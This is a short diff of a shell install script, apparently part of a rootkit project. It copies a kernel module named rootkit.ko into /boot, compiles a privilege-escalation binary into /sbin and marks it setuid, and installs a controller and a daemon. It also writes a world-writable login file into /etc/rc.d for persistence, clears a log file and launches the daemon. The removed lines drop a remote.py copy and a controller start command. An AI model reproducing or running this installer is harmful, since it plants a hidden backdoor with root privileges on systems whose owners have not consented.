@@ -6,14 +6,9 @@ echo "" > /log.txt
 chmod 666 /log.txt
 cp rootkit.ko /boot/kernel
 cc controller.c -o /sbin/controller
-cc priv_esc.c -o priv_esc
-cp priv_esc /sbin/priv_esc
+cc priv_esc.c -o /sbin/priv_esc
 chmod +s /sbin/priv_esc
-cc daemon.c -o daemon
-mv daemon /sbin/daemon
-sed "s/yeet/$1/" login_tmp > login
-mv login /etc/rc.d/login
+cc daemon.c -o /sbin/daemon
+sed "s/yeet/$1/" login_tmp > /etc/rc.d/login
 chmod 777 /etc/rc.d/login
 /sbin/daemon $1 &
-cp remote.py /remote.py
-controller on
